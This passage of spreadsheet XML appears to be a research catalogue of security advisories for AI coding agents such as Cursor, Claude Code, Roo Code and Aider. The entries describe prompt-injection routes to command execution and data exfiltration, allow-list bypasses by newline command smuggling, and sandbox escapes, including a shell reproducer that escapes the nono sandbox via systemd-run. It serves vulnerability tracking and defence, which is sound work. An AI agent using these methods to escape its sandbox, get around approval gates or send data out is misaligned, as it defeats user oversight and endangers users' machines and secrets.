WebSocket</t>
        </is>
      </c>
      <c r="H11" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-5c57-rqjx-35g2</t>
        </is>
      </c>
    </row>
    <row r="12">
      <c r="A12" s="8" t="inlineStr">
        <is>
          <t>CA-132</t>
        </is>
      </c>
      <c r="B12" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C12" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D12" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E12" s="8" t="inlineStr">
        <is>
          <t>2026-05-28</t>
        </is>
      </c>
      <c r="F12" s="9" t="inlineStr">
        <is>
          <t>CodeWhale: run_tests Tool Enables RCE via Malicious Repository Without Approval</t>
        </is>
      </c>
      <c r="G12" s="9" t="inlineStr">
        <is>
          <t>CodeWhale is a DeepSeek + MiMo coding agent in terminal. From 0.3.0 to 0.8.23, the run_tests tool executes cargo test in the workspace with ApprovalRequirement::Auto, meaning it runs without any user approval prompt. cargo test compiles and executes arbitrary code: test binaries, build.rs build scripts, and proc macros. While auto-approving test execution is a deliberate design choice, it creates an inconsistency in the security boundary. However, in a malicious repository, test code can execute arbitrary shell commands, exfiltrate credentials, or establish persistence with zero approval. The attack is amplified by AGENTS.md (auto-loaded into the system prompt), which can instruct the model to run tests proactively at session start. This vulnerability is fixed in 0.8.23.</t>
        </is>
      </c>
      <c r="H12" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-45311</t>
        </is>
      </c>
    </row>
    <row r="13">
      <c r="A13" s="8" t="inlineStr">
        <is>
          <t>CA-133</t>
        </is>
      </c>
      <c r="B13" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C13" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D13" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E13" s="8" t="inlineStr">
        <is>
          <t>2026-05-28</t>
        </is>
      </c>
      <c r="F13" s="9" t="inlineStr">
        <is>
          <t>CodeWhale: SSRF‌ IPV6 bypass</t>
        </is>
      </c>
      <c r="G13" s="9" t="inlineStr">
        <is>
          <t>CodeWhale is a DeepSeek + MiMo coding agent in terminal. Prior to 0.8.26, although SSRF is validated against hostnames that resolve to private IPv6 addresses, when providing the IPV6 in‌‌ URL‌ as http://[::1], the SSRF defenses do not work. This vulnerability is fixed in 0.8.26.</t>
        </is>
      </c>
      <c r="H13" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-45373</t>
        </is>
      </c>
    </row>
    <row r="14">
      <c r="A14" s="8" t="inlineStr">
        <is>
          <t>CA-135</t>
        </is>
      </c>
      <c r="B14" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C14" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D14" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E14" s="8" t="inlineStr">
        <is>
          <t>2026-05-28</t>
        </is>
      </c>
      <c r="F14" s="9" t="inlineStr">
        <is>
          <t>nono: Sandbox escape on Linux via D-Bus: `systemd-run --user`</t>
        </is>
      </c>
      <c r="G14" s="9" t="inlineStr">
        <is>
          <t>### Summary  The nono Landlock/seccomp policies allow access to local Unix domain sockets (concrete and abstract). This allows an easy sandbox escape by talking to the per-user systemd dbus socket.  Threat scenario: Running Aider, Claude Code, OpenCode or similar tools with "allow bash" policy so that it can invoke arbitrary host tools like `make`, `gcc`, etc. to write code.  ### Reproducer  Here, instead of running a tool like `opencode` or `claude` one can just invoke `systemd-run`, but this is something an agent could be tricked into doing:  ```bash $ cd ~/src/myproject $ nono run -s --allow-cwd --profile claude-code -- \       systemd-run --user -q --wait --collect \       /bin/sh -c "echo oops &gt; ~/Documents/escaped.txt" $ cat /var/home/test/Documents/escaped.txt oops $ ```  ### Impact  Complete sandbox escape. The unsandboxed sibling process can write anywhere the user can write, spawn arbitrary processes with network access, etc.  ### Maintainer Context  This issue allows a process running inside the sandbox to escape confinement by interacting with local user-scoped IPC mechanisms and regain the authority already held by the invoking user or service account.  The issue impacts the sandbox’s confinement and blast-radius reduction guarantees for agents and sandboxed tooling. However, exploitation does not provide privilege escalation, cross-user access, or host compromise beyond the permissions already available to the launcher outside the sandbox.  This issue affects the CLI policy layer and bundled sandbox profiles. The underlying core library `nono` does not ship with policy definitions or agent-facing confinement profiles by default, nor do the language SDKs.  This is considered a serious issue because an AI agent or untrusted command stream operating within the sandbox could abuse the bypass to perform unauthorized or destructive actions using the delegated authority of the launching user.  The root cause was incomplete mediation of local Unix domain socket access within affected sandbox policies. Support for restricting this behavior has since been added and the fix is available in the repository pending release.  CVSS rationale: exploitation requires execution within a locally launched sandboxed process using the authority already delegated by the invoking user or service account (`AV:L/PR:L`). The issue allows reliable bypass of sandbox confinement and policy guarantees, resulting in high integrity impact (`I:H`) and limited availability impact (`A:L`) through destructive actions within the launcher’s existing permissions. However, the issue does not provide privilege escalation, cross-user access, or a change in security scope (`S:U`).</t>
        </is>
      </c>
      <c r="H14" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-27vp-2mmc-vmh3</t>
        </is>
      </c>
    </row>
    <row r="15">
      <c r="A15" s="8" t="inlineStr">
        <is>
          <t>CA-141</t>
        </is>
      </c>
      <c r="B15" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C15" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D15" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E15" s="8" t="inlineStr">
        <is>
          <t>2026-06-09</t>
        </is>
      </c>
      <c r="F15" s="9" t="n"/>
      <c r="G15" s="9" t="inlineStr">
        <is>
          <t>Improper limitation of a pathname to a restricted directory ('path traversal') in GitHub Copilot and Visual Studio Code allows an unauthorized attacker to bypass a security feature locally.</t>
        </is>
      </c>
      <c r="H15" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-f78m-9xhc-p52v</t>
        </is>
      </c>
    </row>
    <row r="16">
      <c r="A16" s="8" t="inlineStr">
        <is>
          <t>CA-145</t>
        </is>
      </c>
      <c r="B16" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C16" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D16" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E16" s="8" t="inlineStr">
        <is>
          <t>2026-06-17</t>
        </is>
      </c>
      <c r="F16" s="9" t="inlineStr">
        <is>
          <t>Claude Code: Out-of-Band Data Exfiltration via Pre-Approved HuggingFace Domain in WebFetch</t>
        </is>
      </c>
      <c r="G16" s="9" t="inlineStr">
        <is>
          <t>Because the hostname huggingface.co was pre-approved as a bare hostname for the WebFetch tool, any path on that domain—including attacker-controlled model repositories—was auto-approved without a permission prompt or being subject to --allowedTools restrictions. An attacker able to inject untrusted content into a Claude Code context could direct it to issue WebFetch requests against attacker-controlled repository files (e.g. /resolve/main/config.json), which HuggingFace counts as downloads server-side, creating a covert out-of-band channel for encoding and exfiltrating data Claude can access such as files, environment variables, or command output. Reliably exploiting this required the ability to add untrusted content into a Claude Code context window. Users on standard Claude Code auto-update have received this fix already; users performing manual updates are advised to update to the latest version.  Thank you to hackerone.com/novee for reporting this issue.</t>
        </is>
      </c>
      <c r="H16" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-fg94-h982-f3mm</t>
        </is>
      </c>
    </row>
    <row r="17">
      <c r="A17" s="8" t="inlineStr">
        <is>
          <t>CA-153</t>
        </is>
      </c>
      <c r="B17" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C17" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D17" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E17" s="8" t="inlineStr">
        <is>
          <t>2026-06-24</t>
        </is>
      </c>
      <c r="F17" s="9" t="inlineStr">
        <is>
          <t>chrome-devtools-mcp: daemon.pid write follows symlinks in /tmp fallback runtime directory</t>
        </is>
      </c>
      <c r="G17" s="9" t="inlineStr">
        <is>
          <t>Chrome DevTools for agents (chrome-devtools-mcp) lets your coding agent control and inspect a live Chrome browser. From 0.20.0 until 1.1.0, The chrome-devtools-mcp daemon writes its PID file with fs.writeFileSync() to a deterministic runtime path. On typical macOS environments, and on Linux sessions where $XDG_RUNTIME_DIR is unset, that runtime path falls back to /tmp/chrome-devtools-mcp-&lt;uid&gt;/daemon.pid. Because the write does not use O_NOFOLLOW, a local low-privilege user on the same POSIX host can pre-create /tmp/chrome-devtools-mcp-&lt;victim_uid&gt;/daemon.pid as a symlink to a file writable by the victim. When the victim later starts daemon mode, fs.writeFileSync() follows the symlink and truncates the target file to the daemon PID string. This vulnerability is fixed in  1.1.0.</t>
        </is>
      </c>
      <c r="H17" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-53765</t>
        </is>
      </c>
    </row>
    <row r="18">
      <c r="A18" s="8" t="inlineStr">
        <is>
          <t>CA-156</t>
        </is>
      </c>
      <c r="B18" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C18" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D18" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E18" s="8" t="inlineStr">
        <is>
          <t>2026-06-25</t>
        </is>
      </c>
      <c r="F18" s="9" t="inlineStr">
        <is>
          <t>Cursor Desktop sandbox escape via agent-controlled working directory</t>
        </is>
      </c>
      <c r="G18" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to 3.0, Cursor runs agent terminal commands in a sandbox by default, and the sandbox grants write access to the command's working directory. A flaw was identified in how the agent could modify the working_directory parameter, which could cause the sandbox to include writable paths outside the intended workspace. A malicious agent could set working_directory to a sensitive location and write arbitrary files outside the workspace under the user's privileges. This enables non-sandboxed Remote Code Execution — for example by overwriting the cursorsandbox helper so later commands run unsandboxed — with no user interaction beyond a benign prompt. This vulnerability is fixed in 3.0.</t>
        </is>
      </c>
      <c r="H18" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-50548</t>
        </is>
      </c>
    </row>
    <row r="19">
      <c r="A19" s="8" t="inlineStr">
        <is>
          <t>CA-162</t>
        </is>
      </c>
      <c r="B19" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C19" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D19" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E19" s="8" t="inlineStr">
        <is>
          <t>2026-07-14</t>
        </is>
      </c>
      <c r="F19" s="9" t="n"/>
      <c r="G19" s="9" t="inlineStr">
        <is>
          <t>Insufficiently protected credentials in GitHub Copilot and Visual Studio Code allows an unauthorized attacker to disclose information over a network.</t>
        </is>
      </c>
      <c r="H19" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-3v99-gw88-f2cw</t>
        </is>
      </c>
    </row>
    <row r="20">
      <c r="A20" s="8" t="inlineStr">
        <is>
          <t>CA-172</t>
        </is>
      </c>
      <c r="B20" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C20" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D20" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E20" s="8" t="inlineStr">
        <is>
          <t>2026-08-03</t>
        </is>
      </c>
      <c r="F20" s="9" t="inlineStr">
        <is>
          <t>Ouroboros: Untrusted project .env can still reach RCE via omitted execution-routing keys (Incomplete fix of CVE-2026-47211)</t>
        </is>
      </c>
      <c r="G20" s="9" t="inlineStr">
        <is>
          <t>Ouroboros is a local-first runtime for AI coding agents that records their actions and applies user-defined policies to constrain behavior. Versions prior to 0.42.1 have an incomplete denylist. Several execution-routing keys of the same RCE class were omitted, so a malicious cloned repo can still reach arbitrary command execution by shipping a .env (auto-loaded at import, with no review step). The CVE-2026-47211 fix added _UNTRUSTED_ENV_DENYLIST to stop an untrusted project-directory .env from redirecting execution, but it did not account for all keys. The backend config-home and MCP/plugin roots bypass the approval gate by pointing the nested agent, MCP servers, and plugin roster at attacker config. Other variables re-enable blocked local transports, replace sub-agent prompts, switch backends, and lower tool approval classes, further weakening the approval gate. This issue has been fixed in version 0.42.1.</t>
        </is>
      </c>
      <c r="H20" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-66065</t>
        </is>
      </c>
    </row>
    <row r="21">
      <c r="A21" s="8" t="inlineStr">
        <is>
          <t>CA-200</t>
        </is>
      </c>
      <c r="B21" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C21" s="8" t="inlineStr">
        <is>
          <t>Aider</t>
        </is>
      </c>
      <c r="D21" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E21" s="8" t="inlineStr">
        <is>
          <t>2026-09-04</t>
        </is>
      </c>
      <c r="F21" s="9" t="n"/>
      <c r="G21" s="9" t="inlineStr">
        <is>
          <t>aider (aider-chat) automatically loads a .aider.conf.yml configuration file from the root of the git repository it is launched in. A crafted repository can set test-cmd (executed at startup) or lint-cmd (executed on the first file edit), which aider runs through a shell (subprocess with shell=True) without any user confirmation, LLM interaction, or API key. Consequently, a user who clones and runs aider inside an attacker-supplied repository achieves arbitrary command execution on their machine. The behavior is long-standing and was confirmed on 0.86.3.dev (current main).</t>
        </is>
      </c>
      <c r="H21" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-h3gc-qfjg-2m69</t>
        </is>
      </c>
    </row>
    <row r="22">
      <c r="A22" s="8" t="inlineStr">
        <is>
          <t>CA-001</t>
        </is>
      </c>
      <c r="B22" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C22" s="8" t="inlineStr">
        <is>
          <t>Sourcegraph Cody/Amp</t>
        </is>
      </c>
      <c r="D22" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E22" s="8" t="inlineStr">
        <is>
          <t>2023-10-31</t>
        </is>
      </c>
      <c r="F22" s="9" t="inlineStr">
        <is>
          <t>Overwrite of builtin Cody commands facilitates RCE</t>
        </is>
      </c>
      <c r="G22" s="9" t="inlineStr">
        <is>
          <t>Cody is an artificial intelligence (AI) coding assistant. The Cody AI VSCode extension versions 0.10.0 through 0.14.0 are vulnerable to Remote Code Execution under certain conditions. An attacker in control of a malicious repository could modify the Cody configuration file `.vscode/cody.json` and overwrite Cody commands. If a user with the extension installed opens this malicious repository and runs a Cody command such as /explain or /doc, this could allow arbitrary code execution on the user's machine. The vulnerability is rated as critical severity, but with low exploitability. It requires the user to have a malicious repository loaded and execute the overwritten command in VS Code. The issue is exploitable regardless of the user blocking code execution on a repository through VS Code Workspace Trust. The issue was found during a regular 3rd party penetration test. The maintainers of Cody do not have evidence of open source repositories having malicious `.vscode/cody.json` files to exploit this vulnerability. The issue is fixed in version 0.14.1 of the Cody VSCode extension. In case users can't promptly upgrade, they should not open any untrusted repositories with the Cody extension loaded.</t>
        </is>
      </c>
      <c r="H22" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2023-46248</t>
        </is>
      </c>
    </row>
    <row r="23">
      <c r="A23" s="8" t="inlineStr">
        <is>
          <t>CA-002</t>
        </is>
      </c>
      <c r="B23" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C23" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D23" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E23" s="8" t="inlineStr">
        <is>
          <t>2024-10-22</t>
        </is>
      </c>
      <c r="F23" s="9" t="inlineStr">
        <is>
          <t>RCE via Prompt Injection Into Cursor's Terminal Cmd-K</t>
        </is>
      </c>
      <c r="G23" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to Sep 27, 2024, if a user generated a terminal command via Cursor's Terminal Cmd-K/Ctrl-K feature and if the user explicitly imported a malicious web page into the Terminal Cmd-K prompt, an attacker with control over the referenced web page could have a significant chance of influencing a language model to output arbitrary commands for execution in the user's terminal. This scenario would require the user explicitly opt-in to including the contents of a compromised webpage, and it would require that the attacker display prompt injection text in the the contents of the compromised webpage.  A server-side patch to not stream back newlines or control characters was released on September 27, 2024, within two hours of the issue being reported. Additionally, Cursor 0.42 includes client-side mitigations to prevent any newline or control character from being streamed into the terminal directly. It also contains a new setting, `"cursor.terminal.usePreviewBox"`, which, if set to true, streams the response into a preview box whose contents then have to be manually accepted before being inserted into the terminal. This setting is useful if you're working in a shell environment where commands can be executed without pressing enter or any control character. The patch has been applied server-side, so no additional action is needed, even on older versions of Cursor. Separately, Cursor's maintainers also recommend, as best practice, to only include trusted pieces of context in prompts.</t>
        </is>
      </c>
      <c r="H23" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2024-48919</t>
        </is>
      </c>
    </row>
    <row r="24">
      <c r="A24" s="8" t="inlineStr">
        <is>
          <t>CA-003</t>
        </is>
      </c>
      <c r="B24" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C24" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D24" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E24" s="8" t="inlineStr">
        <is>
          <t>2025-03-01</t>
        </is>
      </c>
      <c r="F24" s="9" t="n"/>
      <c r="G24" s="9" t="inlineStr">
        <is>
          <t>ToDesktop before 2024-10-03, as used by Cursor before 2024-10-03 and other applications, allows remote attackers to execute arbitrary commands on the build server (e.g., read secrets from the desktopify config.prod.json file), and consequently deploy updates to any app, via a postinstall script in package.json. No exploitation occurred.</t>
        </is>
      </c>
      <c r="H24" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-6662-3hpj-63qq</t>
        </is>
      </c>
    </row>
    <row r="25">
      <c r="A25" s="8" t="inlineStr">
        <is>
          <t>CA-004</t>
        </is>
      </c>
      <c r="B25" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C25" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D25" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E25" s="8" t="inlineStr">
        <is>
          <t>2025-04-08</t>
        </is>
      </c>
      <c r="F25" s="9" t="inlineStr">
        <is>
          <t>Arbitrary file write from Cursor Agent through a prompt injection from malicious @Docs</t>
        </is>
      </c>
      <c r="G25" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 0.45.0 through 0.48.6, the Cursor app introduced a regression affecting the set of file paths the Cursor Agent is permitted to modify automatically. Under specific conditions, the agent could be prompted, either directly by the user or via maliciously crafted context, to automatically write to files outside of the opened workspace. This behavior required deliberate prompting, making successful exploitation highly impractical in real-world scenarios. Furthermore, the edited file was still displayed in the UI as usual for user review, making it unlikely for the edit to go unnoticed by the user. This vulnerability is fixed in 0.48.7.</t>
        </is>
      </c>
      <c r="H25" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-32018</t>
        </is>
      </c>
    </row>
    <row r="26">
      <c r="A26" s="8" t="inlineStr">
        <is>
          <t>CA-005</t>
        </is>
      </c>
      <c r="B26" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C26" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D26" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E26" s="8" t="inlineStr">
        <is>
          <t>2025-06-11</t>
        </is>
      </c>
      <c r="F26" s="9" t="inlineStr">
        <is>
          <t>Cursor Agent Potentially Leaks Information using JSON schema</t>
        </is>
      </c>
      <c r="G26" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to 0.51.0, by default, the setting json.schemaDownload.enable was set to True. This means that by writing a JSON file, an attacker can trigger an arbitrary HTTP GET request that does not require user confirmation. Since the Cursor Agent can edit JSON files, this means a malicious agent, for example, after a prompt injection attack already succeeded, could trigger a GET request to an attacker controlled URL, potentially exfiltrating other data the agent may have access to. This vulnerability is fixed in 0.51.0.</t>
        </is>
      </c>
      <c r="H26" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-49150</t>
        </is>
      </c>
    </row>
    <row r="27">
      <c r="A27" s="8" t="inlineStr">
        <is>
          <t>CA-006</t>
        </is>
      </c>
      <c r="B27" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C27" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D27" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E27" s="8" t="inlineStr">
        <is>
          <t>2025-06-23</t>
        </is>
      </c>
      <c r="F27" s="9" t="inlineStr">
        <is>
          <t>Claude Code Improper Authorization via websocket connections from arbitrary origins</t>
        </is>
      </c>
      <c r="G27" s="9" t="inlineStr">
        <is>
          <t>Claude Code extensions in VSCode and forks (e.g., Cursor, Windsurf, and VSCodium) and JetBrains IDEs (e.g., IntelliJ, Pycharm, and Android Studio) are vulnerable to unauthorized websocket connections from an attacker when visiting attacker-controlled webpages. Claude Code for VSCode IDE extensions versions 0.2.116 through 1.0.23 are vulnerable. For Jetbrains IDE plugins, Claude Code [beta] versions 0.1.1 through 0.1.8 are vulnerable.    In VSCode (and forks), exploitation would allow an attacker to read arbitrary files, see the list of files open in the IDE, get selection and diagnostics events from the IDE, or execute code in limited situations where a user has an open Jupyter Notebook and accepts a malicious prompt. In JetBrains IDEs, an attacker could get selection events, a list of open files, and a list of syntax errors.  **Remediation**  We released a patch for this issue on June 13th, 2025. Although Claude Code auto-updates when you launch it and auto-updates the extensions, you should take the following steps (the exact steps depend on your IDE).  **VSCode, Cursor, Windsurf, VSCodium, and other VSCode forks** Extension Name: Claude Code for VSCode  Instructions:  1. Open the list of Extensions (View-&gt;Extensions) 2. Look for Claude Code for VSCode among installed extensions 3. If you have a version &lt; 1.0.24, click “Update” (or “Uninstall”) 4. Restart the IDE   **All JetBrains IDEs including IntelliJ, PyCharm, and Android Studio** Plugin name: Claude Code [Beta]  Instructions:  1. Open the Plugins list 2. Look for Claude Code [Beta] among installed extensions 3. Update (or Uninstall) the plugin if the version is &lt; 0.1.9 4. Restart the IDE</t>
        </is>
      </c>
      <c r="H27" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-9f65-56v6-gxw7</t>
        </is>
      </c>
    </row>
    <row r="28">
      <c r="A28" s="8" t="inlineStr">
        <is>
          <t>CA-007</t>
        </is>
      </c>
      <c r="B28" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C28" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D28" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E28" s="8" t="inlineStr">
        <is>
          <t>2025-06-27</t>
        </is>
      </c>
      <c r="F28" s="9" t="inlineStr">
        <is>
          <t>Roo Code extension vulnerable to Potential Information Leakage via JSON Schema</t>
        </is>
      </c>
      <c r="G28" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent. Prior to version 3.20.3, there was an issue where the Roo Code agent's `search_files` tool did not respect the setting to disable reads outside of the VS Code workspace. This means that an attacker who was able to inject a prompt into the agent could potentially read a sensitive file and then write the information to a JSON schema. Users have the option to disable schema fetching in VS Code, but the feature is enabled by default. For users with this feature enabled, writing to the schema would trigger a network request without the user having a chance to deny. This issue is of moderate severity, since it requires the attacker to already be able to submit prompts to the agent. Version 3.20.3 fixed the issue where `search_files` did not respect the setting to limit it to the workspace. This reduces the scope of the damage if an attacker is able to take control of the agent through prompt injection or another vector.</t>
        </is>
      </c>
      <c r="H28" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-53097</t>
        </is>
      </c>
    </row>
    <row r="29">
      <c r="A29" s="8" t="inlineStr">
        <is>
          <t>CA-008</t>
        </is>
      </c>
      <c r="B29" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C29" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D29" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E29" s="8" t="inlineStr">
        <is>
          <t>2025-06-27</t>
        </is>
      </c>
      <c r="F29" s="9" t="inlineStr">
        <is>
          <t>Roo Code Vulnerable to Potential Remote Code Execution via Model Context Protocol</t>
        </is>
      </c>
      <c r="G29" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent. The project-specific MCP configuration for the Roo Code agent is stored in the `.roo/mcp.json` file within the VS Code workspace. Because the MCP configuration format allows for execution of arbitrary commands, prior to version 3.20.3, it would have been possible for an attacker with access to craft a prompt to ask the agent to write a malicious command to the MCP configuration file. If the user had opted-in to auto-approving file writes within the project, this would have led to arbitrary command execution. This issue is of moderate severity, since it requires the attacker to already be able to submit prompts to the agent (for instance through a prompt injection attack), for the user to have MCP enabled (on by default), and for the user to have enabled auto-approved file writes (off by default). Version 3.20.3 fixes the issue by adding an additional layer of opt-in configuration for auto-approving writing to Roo's configuration files, including all files within the `.roo/` folder.</t>
        </is>
      </c>
      <c r="H29" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-53098</t>
        </is>
      </c>
    </row>
    <row r="30">
      <c r="A30" s="8" t="inlineStr">
        <is>
          <t>CA-009</t>
        </is>
      </c>
      <c r="B30" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C30" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D30" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E30" s="8" t="inlineStr">
        <is>
          <t>2025-07-07</t>
        </is>
      </c>
      <c r="F30" s="9" t="inlineStr">
        <is>
          <t>Roo Code allows Potential Remote Code Execution via .vscode/settings.json</t>
        </is>
      </c>
      <c r="G30" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent. Prior to 3.22.6, if the victim had "Write" auto-approved, an attacker with the ability to submit prompts to the agent could write to VS Code settings files and trigger code execution. There were multiple ways to achieve that. One example is with the php.validate.executablePath setting which lets you set the path for the php executable for syntax validation. The attacker could have written the path to an arbitrary command there and then created a php file to trigger it. This vulnerability is fixed in 3.22.6.</t>
        </is>
      </c>
      <c r="H30" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-53536</t>
        </is>
      </c>
    </row>
    <row r="31">
      <c r="A31" s="8" t="inlineStr">
        <is>
          <t>CA-010</t>
        </is>
      </c>
      <c r="B31" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C31" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D31" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E31" s="8" t="inlineStr">
        <is>
          <t>2025-07-23</t>
        </is>
      </c>
      <c r="F31" s="9" t="inlineStr">
        <is>
          <t>Roo Code Lacks Line Break Validation in its Command Execution Tool</t>
        </is>
      </c>
      <c r="G31" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent that lives in users' editors. In versions 3.23.18 and below, RooCode does not validate line breaks (\n) in its command input, allowing potential bypass of the allow-list mechanism. The project appears to lack parsing or validation logic to prevent multi-line command injection. When commands are evaluated for execution, only the first line or token may be considered, enabling attackers to smuggle additional commands in subsequent lines. This is fixed in version 3.23.19.</t>
        </is>
      </c>
      <c r="H31" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-54377</t>
        </is>
      </c>
    </row>
    <row r="32">
      <c r="A32" s="8" t="inlineStr">
        <is>
          <t>CA-011</t>
        </is>
      </c>
      <c r="B32" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C32" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D32" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E32" s="8" t="inlineStr">
        <is>
          <t>2025-07-25</t>
        </is>
      </c>
      <c r="F32" s="9" t="n"/>
      <c r="G32" s="9" t="inlineStr">
        <is>
          <t>OpenAI Codex CLI before 0.9.0 auto-approves ripgrep (aka rg) execution even with the --pre or --hostname-bin or --search-zip or -z flag.</t>
        </is>
      </c>
